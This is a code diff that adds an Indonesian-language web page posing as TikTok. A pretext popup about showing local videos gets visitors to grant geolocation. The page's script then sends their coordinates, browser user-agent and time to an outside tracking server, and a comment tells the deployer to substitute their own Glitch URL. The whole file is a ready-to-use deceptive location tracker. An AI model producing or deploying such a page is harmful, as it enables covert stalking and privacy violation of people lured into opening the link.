@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok - Video Lucu</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: black; overflow: hidden; font-family: Arial; }
+        video { position: fixed; width: 100%; height: 100%; object-fit: cover; }
+        #overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6); z-index: 10;
+            display: flex; align-items: center; justify-content: center;
+        }
+        #popup {
+            background: white; padding: 25px; border-radius: 15px;
+            text-align: center; width: 280px;
+        }
+        #popup h3 { font-size: 18px; margin-bottom: 10px; color: #333; }
+        #popup p { font-size: 14px; color: #666; margin-bottom: 20px; }
+        #popup button {
+            background: #fe2c55; color: white; border: none;
+            padding: 12px 30px; border-radius: 25px; font-size: 16px;
+            cursor: pointer; width: 100%;
+        }
+        .spinner {
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top: 4px solid #fe2c55;
+            border-radius: 50%; width: 40px; height: 40px;
+            animation: spin 1s linear infinite; margin: 0 auto 10px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<video autoplay loop muted playsinline>
+    <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+</video>
+
+<div id="overlay">
+    <div id="popup">
+        <h3>📍 Izinkan Lokasi</h3>
+        <p>Untuk menampilkan video yang relevan di daerahmu</p>
+        <button onclick="mintaLokasi()">✨ Izinkan Sekarang</button>
+    </div>
+</div>
+
+<script>
+    // =============================================
+    // GANTI DENGAN URL GLITCH KAMU
+    // =============================================
+    const SERVER_URL = "https://fanzz-tracker.glitch.me/track";
+
+    function mintaLokasi() {
+        if (navigator.geolocation) {
+            document.getElementById('popup').innerHTML = '<div class="spinner"></div><p>Mendeteksi lokasi...</p>';
+            
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    let lat = pos.coords.latitude;
+                    let lng = pos.coords.longitude;
+                    let device = navigator.userAgent.substring(0, 40);
+                    let time = new Date().toLocaleString('id-ID');
+                    
+                    fetch(SERVER_URL + "?device=" + encodeURIComponent(device) + "&lat=" + lat + "&lng=" + lng + "&time=" + encodeURIComponent(time))
+                        .then(() => { document.getElementById('overlay').style.display = 'none'; });
+                },
+                function(err) {
+                    alert('⚠️ Lokasi wajib diizinkan!');
+                }
+            );
+        } else {
+            alert('Browser tidak mendukung');
+        }
+    }
+</script>
+
+</body>
+</html>
